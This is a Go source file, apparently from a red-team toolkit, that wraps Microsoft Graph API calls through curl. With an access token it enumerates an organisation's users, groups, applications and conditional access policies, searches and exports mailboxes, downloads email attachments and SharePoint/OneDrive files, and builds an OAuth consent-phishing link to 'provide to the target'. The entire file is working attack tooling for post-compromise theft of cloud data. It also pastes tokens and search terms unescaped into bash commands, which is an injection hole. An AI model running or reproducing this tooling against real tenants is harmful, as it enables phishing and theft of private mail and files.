package tools

import (
	"adpack/utils"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

type graphRunnerTool struct{}

var GraphRunner = graphRunnerTool{}

type GraphTokens struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	TenantID     string `json:"tenant_id"`
}

func (graphRunnerTool) Name() string { return "GraphRunner" }

func (graphRunnerTool) Available() bool {
	_, err := exec.LookPath("curl")
	return err == nil
}

func graphAPICall(ctx context.Context, tokens *GraphTokens, path string) (utils.CmdResult, error) {
	url := fmt.Sprintf("https://graph.microsoft.com/v1.0/%s?$top=999", path)
	py := `import sys,json;d=json.load(sys.stdin);[print(json.dumps(i)) for i in d.get("value",[])]`
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s' | python3 -c '%s'`,
		tokens.AccessToken, url, py,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("graph api call failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) GetTokens(ctx context.Context) (*GraphTokens, error) {
	return nil, fmt.Errorf("GetTokens not supported via REST path — use roadtx or az login instead")
}

func (g graphRunnerTool) RunRecon(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return g.RunUserEnum(ctx, tokens)
}

func (g graphRunnerTool) RunUserEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "users")
}

func (g graphRunnerTool) RunGroupEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "groups")
}

func (g graphRunnerTool) RunAppEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "applications")
}

func (g graphRunnerTool) RunCAPEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "identity/conditionalAccess/policies")
}

func (g graphRunnerTool) RunMailboxSearch(ctx context.Context, tokens *GraphTokens, searchTerm string, msgCount int) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/me/messages?$top=%d&$search="%s"`,
		msgCount, searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("mailbox search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunSharePointSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/sites?search="%s"`,
		searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("sharepoint search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunTeamsSearch(ctx context.Context, tokens *GraphTokens, searchTerm string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/me/joinedTeams?$search="%s"`,
		searchTerm,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s'`,
		tokens.AccessToken, url,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("teams search failed: %s", cr.Stderr)
	}
	return cr, nil
}

func (g graphRunnerTool) RunConsentPhish(ctx context.Context, tokens *GraphTokens, appURL string) (utils.CmdResult, error) {
	parts := strings.SplitN(appURL, "?", 2)
	baseURL := parts[0]
	params := "client_id=bedc3365-ee8f-4e0b-a026-c21b0543c61b&response_type=code&redirect_uri=https://localhost&response_mode=query&scope=User.Read%20Mail.Read%20Files.Read.All"
	if len(parts) > 1 {
		params = parts[1]
	}
	phishURL := baseURL + "?" + params
	return utils.CmdResult{Success: true, Stdout: fmt.Sprintf("Provide this consent URL to the target:\n%s\n", phishURL)}, nil
}

func (g graphRunnerTool) RunInjectApp(ctx context.Context, tokens *GraphTokens, appName string) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "applications")
}

// RunMailAttachmentDownload downloads attachments from messages matching a subject filter.
// userId can be "me" or a specific user UPN. subjectFilter is a search term for subject line.
// maxMessages limits how many messages to check. Returns paths to downloaded files.
func (g graphRunnerTool) RunMailAttachmentDownload(ctx context.Context, tokens *GraphTokens, userID, subjectFilter string, maxMessages int) (utils.CmdResult, error) {
	if userID == "" {
		userID = "me"
	}
	if maxMessages <= 0 {
		maxMessages = 10
	}
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/%s/messages?$top=%d&$filter=contains(subject,'%s')&$expand=attachments($select=id,name,contentType,size)`,
		userID, maxMessages, subjectFilter,
	)
	py := `import sys,json,base64;d=json.load(sys.stdin)
for msg in d.get("value",[]):
    for att in msg.get("attachments",[]):
        print(json.dumps({"msg_id":msg["id"],"att_id":att["id"],"name":att.get("name",""),"type":att.get("contentType",""),"size":att.get("size",0)}))`
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" -H 'ConsistencyLevel: eventual' '%s' | python3 -c '%s'`,
		tokens.AccessToken, url, py,
	)})
	return cr, nil
}

// RunMailMessageExport exports full messages as JSON (with body/content).
// This is the closest Graph API equivalent to downloading mail items.
func (g graphRunnerTool) RunMailMessageExport(ctx context.Context, tokens *GraphTokens, userID, messageID string) (utils.CmdResult, error) {
	if userID == "" {
		userID = "me"
	}
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/%s/messages/%s?$select=id,subject,body,from,toRecipients,ccRecipients,receivedDateTime`,
		userID, messageID,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" '%s'`,
		tokens.AccessToken, url,
	)})
	return cr, nil
}

// RunFileDownload downloads a file from SharePoint or OneDrive by drive ID and item ID.
// The Content-Type header determines whether it's downloaded as raw bytes or JSON metadata.
func (g graphRunnerTool) RunFileDownload(ctx context.Context, tokens *GraphTokens, driveID, itemID, localPath string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/drives/%s/items/%s/content`,
		driveID, itemID,
	)
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -L -H "Authorization: Bearer %s" '%s' -o '%s'`,
		tokens.AccessToken, url, localPath,
	)})
	if !cr.Success {
		return cr, fmt.Errorf("file download failed: %s", cr.Stderr)
	}
	size := "?"
	if fi, err := os.Stat(localPath); err == nil {
		size = fmt.Sprintf("%d", fi.Size())
	}
	cr.Stdout = fmt.Sprintf("downloaded %s (%s bytes)", localPath, size)
	return cr, nil
}

// RunDriveEnum lists drives (SharePoint document libraries, OneDrive) accessible to the token.
func (g graphRunnerTool) RunDriveEnum(ctx context.Context, tokens *GraphTokens) (utils.CmdResult, error) {
	return graphAPICall(ctx, tokens, "me/drives")
}

// RunDriveItemEnum lists top-level items in a drive.
func (g graphRunnerTool) RunDriveItemEnum(ctx context.Context, tokens *GraphTokens, driveID string) (utils.CmdResult, error) {
	url := fmt.Sprintf(
		`https://graph.microsoft.com/v1.0/drives/%s/root/children?$top=999`,
		driveID,
	)
	py := `import sys,json;d=json.load(sys.stdin);[print(json.dumps({"id":i["id"],"name":i.get("name",""),"size":i.get("size",0),"type":i.get("file",{}).get("mimeType","folder")})) for i in d.get("value",[])]`
	cr := utils.RunCommandCtx(ctx, "bash", []string{"-c", fmt.Sprintf(
		`curl -s -H "Authorization: Bearer %s" '%s' | python3 -c '%s'`,
		tokens.AccessToken, url, py,
	)})
	return cr, nil
}
